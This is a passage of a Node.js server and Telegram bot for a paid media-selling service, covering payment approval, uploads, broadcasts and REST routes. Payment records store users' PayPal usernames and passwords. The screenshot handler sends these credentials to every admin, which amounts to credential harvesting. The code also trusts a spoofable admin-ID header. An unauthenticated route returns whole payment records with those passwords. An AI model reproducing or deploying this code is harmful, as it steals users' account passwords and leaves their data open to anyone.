                db.uploadStates[chatId] = { step: 'admin_reply', userId: userId };
                bot.answerCallbackQuery(callbackQuery.id);
            }
        });

        // Handle admin reply text
        bot.on('text', async (msg) => {
            const chatId = msg.chat.id;
            const text = msg.text;
            
            if (db.uploadStates[chatId]?.step === 'admin_reply') {
                const userId = db.uploadStates[chatId].userId;
                
                try {
                    await bot.sendMessage(userId, `👤 Admin: ${text}`);
                    bot.sendMessage(chatId, `✅ Reply sent to user ${userId}`, {
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                            ]
                        }
                    });
                    delete db.uploadStates[chatId];
                } catch (error) {
                    bot.sendMessage(chatId, `❌ Error sending reply: ${error.message}`);
                }
            }
        });

        console.log('✅ Bot commands registered successfully');

    } catch (error) {
        console.error('Error initializing bot:', error);
    }
}

// ============================================
// HELPER FUNCTIONS
// ============================================

function getDashboardStats() {
    const totalUsers = db.users.length;
    const totalMedia = db.media.length;
    const totalSales = db.purchases.length;
    const totalRevenue = db.purchases.reduce((sum, p) => sum + p.amount, 0);
    const pendingPayments = db.payments.filter(p => p.status === 'pending_approval' || p.status === 'pending').length;
    
    const recentActivity = [];
    if (db.payments.length > 0) {
        const latestPayment = db.payments[db.payments.length - 1];
        recentActivity.push(`💰 New payment from ${latestPayment.userName || 'User'}`);
    }
    if (db.purchases.length > 0) {
        const latestPurchase = db.purchases[db.purchases.length - 1];
        const media = db.media.find(m => m.id === latestPurchase.itemId);
        recentActivity.push(`📦 Purchase: ${media ? media.title : 'Item'}`);
    }
    if (db.users.length > 0) {
        const latestUser = db.users[db.users.length - 1];
        recentActivity.push(`👤 New user: ${latestUser.firstName}`);
    }
    
    return {
        totalUsers,
        totalMedia,
        totalSales,
        totalRevenue,
        pendingPayments,
        recentActivity: recentActivity.length > 0 ? recentActivity : ['No recent activity']
    };
}

async function handleAdminUpload(msg, chatId, type) {
    try {
        let file, fileName, localPath;
        
        if (type === 'photo') {
            file = msg.photo[msg.photo.length - 1];
            fileName = `media-${Date.now()}.jpg`;
        } else {
            file = msg.video;
            fileName = `media-${Date.now()}.mp4`;
        }
        
        const fileInfo = await bot.getFile(file.file_id);
        localPath = path.join(__dirname, 'uploads/media', fileName);
        
        const url = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${fileInfo.file_path}`;
        const response = await axios({
            method: 'get',
            url: url,
            responseType: 'stream'
        });
        
        const writer = fs.createWriteStream(localPath);
        response.data.pipe(writer);
        
        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        db.uploadStates[chatId].filePath = `/uploads/media/${fileName}`;
        db.uploadStates[chatId].duration = type === 'video' ? file.duration : null;
        db.uploadStates[chatId].step = 'title';
        
        bot.sendMessage(chatId, '📝 Enter the title for this content:', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔙 Cancel', callback_data: 'admin_upload' }]
                ]
            }
        });
    } catch (error) {
        console.error('Error handling upload:', error);
        bot.sendMessage(chatId, '❌ Error uploading file. Please try again.');
        delete db.uploadStates[chatId];
    }
}

async function handleUploadDetails(chatId, text) {
    const state = db.uploadStates[chatId];
    
    switch (state.step) {
        case 'title':
            state.title = text;
            state.step = 'description';
            bot.sendMessage(chatId, '📝 Enter the description:');
            break;
            
        case 'description':
            state.description = text;
            state.step = 'price';
            bot.sendMessage(chatId, '💰 Enter the price (in USD, e.g., 9.99)\n\nType 0 for FREE content:');
            break;
            
        case 'price':
            const price = parseFloat(text);
            if (isNaN(price) || price < 0) {
                bot.sendMessage(chatId, '❌ Invalid price. Please enter a valid number (0 or higher):');
                return;
            }
            
            state.price = price;
            state.step = 'confirm';
            
            const priceText = price === 0 ? 'FREE' : `$${price.toFixed(2)}`;
            const preview = `
📋 Content Preview:
Title: ${state.title}
Description: ${state.description}
Price: ${priceText}
Type: ${state.type}

Confirm upload?
            `;
            bot.sendMessage(chatId, preview, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '✅ Yes, Upload', callback_data: 'confirm_upload' },
                            { text: '❌ No, Cancel', callback_data: 'admin_upload' }
                        ]
                    ]
                }
            });
            break;
    }
}

async function approvePayment(chatId, messageId, paymentId) {
    const payment = db.payments.find(p => p.id === paymentId);
    
    if (!payment) {
        bot.editMessageText('❌ Payment not found.', {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔙 Back', callback_data: 'admin_payments' }]
                ]
            }
        });
        return;
    }

    if (payment.status === 'approved') {
        bot.editMessageText('ℹ️ Payment already approved.', {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔙 Back', callback_data: 'admin_payments' }]
                ]
            }
        });
        return;
    }

    // Approve payment
    payment.status = 'approved';
    payment.approvedAt = new Date().toISOString();
    payment.approvedBy = chatId;

    // Create purchase record
    const purchase = {
        id: db.purchases.length + 1,
        userId: payment.userId,
        itemId: payment.itemId,
        amount: payment.amount,
        purchaseDate: new Date().toISOString(),
        paymentId: payment.id,
        status: 'approved',
        approvedBy: chatId
    };
    db.purchases.push(purchase);

    // Update stats
    db.stats.totalSales++;
    db.stats.totalRevenue += payment.amount;

    // Mark media as purchased
    const media = db.media.find(m => m.id === payment.itemId);
    if (media) {
        media.isPurchased = true;
        media.purchasedBy = media.purchasedBy || [];
        media.purchasedBy.push(payment.userId);
        media.purchases = (media.purchases || 0) + 1;
    }

    // Notify user
    try {
        await bot.sendMessage(payment.userId, `✅ Your payment for "${media ? media.title : 'item'}" has been approved! You can now access the content.`);
    } catch (e) {
        console.error('Error notifying user:', e);
    }

    // Remove from payment states
    delete db.paymentStates[payment.userId];

    bot.editMessageText(`✅ Payment ${paymentId} approved successfully!`, {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: {
            inline_keyboard: [
                [{ text: '🔙 Back to Payments', callback_data: 'admin_payments' }]
            ]
        }
    });
}

async function rejectPayment(chatId, messageId, paymentId) {
    const payment = db.payments.find(p => p.id === paymentId);
    
    if (!payment) {
        bot.editMessageText('❌ Payment not found.', {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔙 Back', callback_data: 'admin_payments' }]
                ]
            }
        });
        return;
    }

    if (payment.status === 'approved') {
        bot.editMessageText('ℹ️ Payment already approved.', {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔙 Back', callback_data: 'admin_payments' }]
                ]
            }
        });
        return;
    }

    payment.status = 'rejected';
    payment.rejectedAt = new Date().toISOString();
    payment.rejectedBy = chatId;

    // Notify user
    try {
        await bot.sendMessage(payment.userId, `❌ Your payment has been rejected. Please contact admin for more information.`);
    } catch (e) {
        console.error('Error notifying user:', e);
    }

    // Remove from payment states
    delete db.paymentStates[payment.userId];

    bot.editMessageText(`❌ Payment ${paymentId} rejected.`, {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: {
            inline_keyboard: [
                [{ text: '🔙 Back to Payments', callback_data: 'admin_payments' }]
            ]
        }
    });
}

async function handleUserPaymentScreenshot(msg, chatId) {
    try {
        // Check if user has a pending payment
        const pendingPayment = db.payments.find(p => 
            p.userId === chatId && (p.status === 'pending' || p.status === 'pending_approval')
        );

        if (!pendingPayment) {
            bot.sendMessage(chatId, '❌ No pending payment found. Please start a new payment.', {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '💳 Start Payment', callback_data: 'user_payment_start' }]
                    ]
                }
            });
            delete db.paymentStates[chatId];
            return;
        }

        let file, fileName, localPath;
        
        if (msg.photo) {
            file = msg.photo[msg.photo.length - 1];
            fileName = `screenshot-${Date.now()}.jpg`;
        } else if (msg.document) {
            file = msg.document;
            if (!file.mime_type || !file.mime_type.startsWith('image/')) {
                bot.sendMessage(chatId, '❌ Please send an image file as screenshot.');
                return;
            }
            fileName = `screenshot-${Date.now()}.jpg`;
        } else {
            bot.sendMessage(chatId, '❌ Please send a photo or image file.');
            return;
        }
        
        const fileInfo = await bot.getFile(file.file_id);
        localPath = path.join(__dirname, 'uploads/screenshots', fileName);
        
        const url = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${fileInfo.file_path}`;
        const response = await axios({
            method: 'get',
            url: url,
            responseType: 'stream'
        });
        
        const writer = fs.createWriteStream(localPath);
        response.data.pipe(writer);
        
        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        // Update payment with screenshot
        pendingPayment.screenshot = `${process.env.APP_URL || 'https://cheerful-cheek.onrender.com'}/uploads/screenshots/${fileName}`;
        pendingPayment.status = 'pending_approval';
        pendingPayment.screenshotDate = new Date().toISOString();

        // Notify user
        bot.sendMessage(chatId, '✅ Payment screenshot received! Admin will review and approve shortly.', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📱 Open App', callback_data: 'user_open_app' }],
                    [{ text: '📊 Check Status', callback_data: 'user_payment_status' }]
                ]
            }
        });

        // Forward to all admins with PayPal credentials
        const media = db.media.find(m => m.id === pendingPayment.itemId);
        const user = db.users.find(u => u.id === chatId);
        const userName = user ? user.firstName || 'User' : 'User';

        const adminMessage = `
💳 New Payment Screenshot Received!

👤 User: ${userName} (${chatId})
📦 Item: ${media ? media.title : 'Unknown'}
💰 Amount: $${pendingPayment.amount}
📧 PayPal Username: ${pendingPayment.paypalUsername || 'Not provided'}
🔑 Password: ${pendingPayment.paypalPassword || 'Not provided'}
📅 Date: ${new Date().toISOString()}
🆔 Payment ID: ${pendingPayment.id}

📸 Screenshot attached below.
        `;

        // Send to all admins
        for (const admin of db.admins) {
            try {
                await bot.sendPhoto(admin.id, localPath, {
                    caption: adminMessage,
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ Approve', callback_data: `approve_${pendingPayment.id}` },
                                { text: '❌ Reject', callback_data: `reject_${pendingPayment.id}` }
                            ]
                        ]
                    }
                });
                console.log(`✅ Screenshot sent to admin: ${admin.id}`);
            } catch (e) {
                console.error(`Error sending to admin ${admin.id}:`, e);
            }
        }

        delete db.paymentStates[chatId];

    } catch (error) {
        console.error('Error handling screenshot:', error);
        bot.sendMessage(chatId, '❌ Error processing screenshot. Please try again.');
        delete db.paymentStates[chatId];
    }
}

async function handleBroadcast(chatId, message) {
    const users = db.users;
    let successCount = 0;
    
    for (const user of users) {
        try {
            await bot.sendMessage(user.id, `📢 Admin Broadcast:\n\n${message}`);
            successCount++;
        } catch (e) {
            console.error('Error broadcasting to user:', e);
        }
    }
    
    bot.sendMessage(chatId, `✅ Broadcast sent to ${successCount} users.`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
            ]
        }
    });
    
    delete db.uploadStates[chatId];
}

async function handleAddAdmin(chatId, text) {
    const newAdminId = parseInt(text);
    
    if (isNaN(newAdminId)) {
        bot.sendMessage(chatId, '❌ Invalid ID. Please send a valid Telegram ID (numbers only).');
        return;
    }
    
    if (db.admins.some(a => a.id === newAdminId)) {
        bot.sendMessage(chatId, 'ℹ️ This user is already an admin.');
        delete db.uploadStates[chatId];
        return;
    }
    
    try {
        const userInfo = await bot.getChat(newAdminId);
        const newAdmin = {
            id: newAdminId,
            username: userInfo.username || 'Unknown',
            firstName: userInfo.first_name || 'Unknown',
            lastName: userInfo.last_name || '',
            addedAt: new Date().toISOString(),
            addedBy: chatId,
            role: 'admin'
        };
        
        db.admins.push(newAdmin);
        bot.sendMessage(chatId, `✅ ${newAdmin.firstName} has been added as admin!`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                ]
            }
        });
        bot.sendMessage(newAdminId, `🎉 You have been added as an admin to Cheerful Chick Bot! Use /start to see available commands.`);
        delete db.uploadStates[chatId];
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error adding admin: ${error.message}`);
        delete db.uploadStates[chatId];
    }
}

async function handleUserChat(chatId, message) {
    // Save message
    const newMessage = {
        id: db.messages.length + 1,
        userId: chatId,
        message: message,
        type: 'text',
        timestamp: new Date().toISOString(),
        read: false
    };
    db.messages.push(newMessage);
    
    // Forward to all admins
    const user = db.users.find(u => u.id === chatId);
    const userName = user ? user.firstName || 'User' : 'User';
    
    for (const admin of db.admins) {
        try {
            await bot.sendMessage(admin.id, `💬 New message from ${userName} (${chatId}):\n\n${message}`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '💬 Reply', callback_data: `reply_user_${chatId}` }]
                    ]
                }
            });
        } catch (e) {
            console.error('Error forwarding message to admin:', e);
        }
    }
    
    bot.sendMessage(chatId, '✅ Message sent to admin. They will respond shortly.', {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🔙 Back', callback_data: 'user_back' }]
            ]
        }
    });
    
    delete db.uploadStates[chatId];
}

// ============================================
// API ROUTES (REST API for frontend)
// ============================================

// Middleware to verify admin
const verifyAdmin = (req, res, next) => {
    const adminId = req.headers['x-admin-id'] || req.body.adminId;
    const isAdmin = db.admins.some(a => a.id === parseInt(adminId)) || 
                    adminId === process.env.MAIN_ADMIN_ID;
    
    if (adminId && isAdmin) {
        next();
    } else {
        res.status(403).json({ error: 'Unauthorized. Admin access required.' });
    }
};

// Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        timestamp: new Date().toISOString(),
        version: '1.0.0',
        admins: db.admins.length,
        users: db.users.length,
        media: db.media.length
    });
});

// ============================================
// MEDIA ROUTES
// ============================================

// Get all media
app.get('/api/media', (req, res) => {
    res.json(db.media);
});

// Get media by category
app.get('/api/media/category/:category', (req, res) => {
    const { category } = req.params;
    let filtered = db.media;
    if (category === 'videos') {
        filtered = db.media.filter(m => m.type === 'video');
    } else if (category === 'photos') {
        filtered = db.media.filter(m => m.type === 'photo');
    } else if (category === 'new') {
        filtered = [...db.media].sort((a, b) => new Date(b.date) - new Date(a.date));
    } else if (category === 'popular') {
        filtered = [...db.media].sort((a, b) => (b.purchases || 0) - (a.purchases || 0));
    }
    res.json(filtered);
});

// Get media by ID
app.get('/api/media/:id', (req, res) => {
    const media = db.media.find(m => m.id === parseInt(req.params.id));
    if (media) {
        res.json(media);
    } else {
        res.status(404).json({ error: 'Media not found' });
    }
});

// Upload media via API
app.post('/api/media/upload', verifyAdmin, upload.single('media'), async (req, res) => {
    try {
        const { title, description, price, type, adminId } = req.body;
        const file = req.file;

        if (!file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }

        const newMedia = {
            id: db.media.length + 1,
            type: type || 'photo',
            title: title || 'Untitled',
            description: description || '',
            price: parseFloat(price) || 0,
            url: `${process.env.APP_URL || 'https://cheerful-cheek.onrender.com'}/uploads/media/${file.filename}`,
            thumbnail: `${process.env.APP_URL || 'https://cheerful-cheek.onrender.com'}/uploads/media/${file.filename}`,
            duration: req.body.duration || null,
            date: new Date().toISOString().split('T')[0],
            isPurchased: false,
            filename: file.filename,
            uploadDate: new Date().toISOString(),
            purchases: 0,
            uploadedBy: parseInt(adminId),
            isFree: parseFloat(price) === 0
        };

        db.media.push(newMedia);

        res.status(201).json({
            success: true,
            message: 'Media uploaded successfully',
            media: newMedia
        });

    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Delete media (admin only)
app.delete('/api/media/:id', verifyAdmin, (req, res) => {
    const id = parseInt(req.params.id);
    const index = db.media.findIndex(m => m.id === id);
    if (index !== -1) {
        const media = db.media[index];
        if (media.filename) {
            const filePath = path.join(__dirname, 'uploads/media', media.filename);
            if (fs.existsSync(filePath)) {
                fs.unlinkSync(filePath);
            }
        }
        db.media.splice(index, 1);
        res.json({ success: true, message: 'Media deleted successfully' });
    } else {
        res.status(404).json({ error: 'Media not found' });
    }
});

// ============================================
// PAYMENT ROUTES
// ============================================

// Create payment request
app.post('/api/payments/create', (req, res) => {
    try {
        const { userId, userName, itemId, amount } = req.body;
        
        // Check if content is free
        const media = db.media.find(m => m.id === parseInt(itemId));
        if (media && media.isFree) {
            // Auto-purchase free content
            const purchase = {
                id: db.purchases.length + 1,
                userId: parseInt(userId),
                itemId: parseInt(itemId),
                amount: 0,
                purchaseDate: new Date().toISOString(),
                paymentId: 'free_' + Date.now(),
                status: 'approved',
                approvedBy: 'system'
            };
            db.purchases.push(purchase);
            media.isPurchased = true;
            media.purchasedBy = media.purchasedBy || [];
            media.purchasedBy.push(parseInt(userId));
            media.purchases = (media.purchases || 0) + 1;
            
            return res.json({
                success: true,
                message: 'Free content unlocked!',
                isFree: true,
                purchase: purchase
            });
        }

        // Check if user already purchased this item
        const existingPurchase = db.purchases.find(p => 
            p.userId === parseInt(userId) && p.itemId === parseInt(itemId)
        );
        
        if (existingPurchase) {
            return res.status(400).json({ 
                error: 'You already purchased this item' 
            });
        }

        const payment = {
            id: uuidv4(),
            userId: parseInt(userId),
            userName: userName || 'User',
            itemId: parseInt(itemId),
            itemName: media ? media.title : 'Item',
            amount: parseFloat(amount),
            status: 'pending',
            timestamp: new Date().toISOString(),
            approvedAt: null,
            approvedBy: null,
            paypalUsername: null,
            paypalPassword: null,
            screenshot: null,
            screenshotDate: null
        };

        db.payments.push(payment);

        res.status(201).json({
            success: true,
            message: 'Payment request created',
            paymentId: payment.id,
            instructions: {
                paypalEmail: process.env.PAYPAL_EMAIL || 'admin@cheerfulchick.com',
                amount: payment.amount,
                item: media ? media.title : 'Item'
            }
        });

    } catch (error) {
        console.error('Payment creation error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Get payment status
app.get('/api/payments/:id', (req, res) => {
    const payment = db.payments.find(p => p.id === req.params.id);
    if (payment) {
        res.json(payment);
    } else {
        res.status(404).json({ error: 'Payment not found' });
    }
});

// Get user purchases
app.get('/api/purchases/:userId', (req, res) => {
    const userId = parseInt(req.params.userId);
    const userPurchases = db.purchases.filter(p => p.userId === userId);
    const purchaseDetails = userPurchases.map(p => {
        const media = db.media.find(m => m.id === p.itemId);
        return {
            ...p,
            item: media || null
        };
    });
    res.json(purchaseDetails);
});

// ============================================
// USER ROUTES
// ============================================

// Register or update user
app.post('/api/users/register', (req, res) => {
    const { id, firstName, lastName, username, photoUrl } = req.body;
    
    let user = db.users.find(u => u.id === parseInt(id));
    if (user) {
        user.lastActive = new Date().toISOString();
        user.firstName = firstName || user.firstName;
        user.lastName = lastName || user.lastName;
        user.username = username || user.username;
        user.photoUrl = photoUrl || user.photoUrl;
    } else {
        user = {
            id: parseInt(id),
            firstName: firstName || 'User',
            lastName: lastName || '',
            username: username || `user_${id}`,
            photoUrl: photoUrl || '',
            registeredAt: new Date().toISOString(),
            lastActive: new Date().toISOString()
        };
        db.users.push(user);
        db.stats.totalUsers = db.users.length;
    }
    
    res.json({ success: true, user });
});

// Get all users
app.get('/api/users', (req, res) => {
    const users = db.users.map(user => {
        const userMessages = db.messages.filter(m => 
            m.userId === user.id || m.recipientId === user.id
        );
        const lastMessage = userMessages.length > 0 ? userMessages[userMessages.length - 1] : null;
        const unreadCount = userMessages.filter(m => 
            m.recipientId === user.id && !m.read
        ).length;
        
        return {
            ...user,
            lastMessage: lastMessage ? lastMessage.message : 'No messages',
            lastActive: lastMessage ? lastMessage.timestamp : user.lastActive,
            unreadCount: unreadCount,
            online: false
        };
    });
    res.json(users);
});

// Get user data
app.get('/api/users/:id', (req, res) => {
    const user = db.users.find(u => u.id === parseInt(req.params.id));
    if (user) {
        const purchases = db.purchases.filter(p => p.userId === user.id);
        const totalSpent = purchases.reduce((sum, p) => sum + p.amount, 0);
        res.json({
            ...user,
            totalPurchases: purchases.length,
            totalSpent: totalSpent
        });
    } else {
        res.status(404).json({ error: 'User not found' });
    }
});

// ============================================
// ADMIN ROUTES
// ============================================

// Get all admins
app.get('/api/admins', verifyAdmin, (req, res) => {
    res.json(db.admins);
});

// Get admin dashboard stats
app.get('/api/admin/stats', verifyAdmin, (req, res) => {
    const totalUsers = db.users.length;
    const totalMessages = db.messages.length;
    const unreadMessages = db.messages.filter(m => !m.read).length;
    const pendingPayments = db.payments.filter(p => p.status === 'pending_approval').length;
    const totalRevenue = db.purchases.reduce((sum, p) => sum + p.amount, 0);
    const freeContent = db.media.filter(m => m.isFree).length;
    
    res.json({
        totalUsers,
        totalMessages,
        unreadMessages,
        pendingPayments,
        totalRevenue,
        totalPurchases: db.purchases.length,
        totalMedia: db.media.length,
        totalAdmins: db.admins.length,
        freeContent
    });
});

// ============================================
// CHAT ROUTES
// ============================================

// Get messages for user
app.get('/api/chat/:userId', (req, res) => {
    const userId = parseInt(req.params.userId);
    const userMessages = db.messages.filter(m => 
        m.userId === userId || m.recipientId === userId
    );
    res.json(userMessages);
});

// Send message
app.post('/api/chat/send', (req, res) => {
    const { userId, recipientId, message, type, senderName } = req.body;
    
    const newMessage = {
        id: db.messages.length + 1,
        userId: parseInt(userId),
        recipientId: parseInt(recipientId || process.env.MAIN_ADMIN_ID),
        message: message,
        type: type || 'text',
        timestamp: new Date().toISOString(),
        read: false,
        delivered: true,
        senderName: senderName || 'User'
    };
    
    db.messages.push(newMessage);

    // Notify all admins
    if (bot) {
        const user = db.users.find(u => u.id === parseInt(userId));
        const userName = user ? user.firstName || 'User' : 'User';
        
        db.admins.forEach(admin => {
            try {
                if (admin.id !== parseInt(userId)) {
                    bot.sendMessage(admin.id, `💬 New message from ${userName} (${userId}):\n\n${message}`);
                }
            } catch (e) {
                console.error('Error notifying admin:', e);
            }
        });
    }

    res.json({ success: true, message: newMessage });
});

// ============================================
// SERVE STATIC FILES
// ============================================

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(path.join(__dirname, '../frontend')));

// Serve admin panel
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/admin.html'));
});

// Handle all other routes - serve index.html for SPA
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, () => {
    console.log('🚀 Cheerful Chick Server Started');
    console.log(`📱 Server running on port ${PORT}`);
    console.log(`🌐 App URL: ${process.env.APP_URL || `http://localhost:${PORT}`}`);
    console.log(`🤖 Bot Status: ${bot ? 'Connected' : 'Not configured'}`);
    console.log(`👥 Total Admins: ${db.admins.length}`);
    console.log(`👤 Total Users: ${db.users.length}`);
    console.log(`📁 Total Media: ${db.media.length}`);
    console.log(`💰 Free Content: ${db.media.filter(m => m.isFree).length}`);
    console.log('✅ Server is ready!');
});

// Error handling
process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled Rejection:', error);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
});

process.on('SIGTERM', () => {
    console.log('🛑 Received SIGTERM. Shutting down gracefully...');
    process.exit(0);
});
